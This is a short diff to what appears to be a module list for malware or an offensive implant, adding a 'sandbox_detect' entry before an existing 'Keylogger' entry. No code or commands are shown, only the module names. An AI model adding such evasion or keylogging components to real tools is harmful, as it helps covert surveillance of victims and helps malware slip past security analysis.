@@ -1,5 +1,8 @@
 [
  {
+   "module": "sandbox_detect"
+ },
+ {
     "module": "Keylogger"
  }
 ]
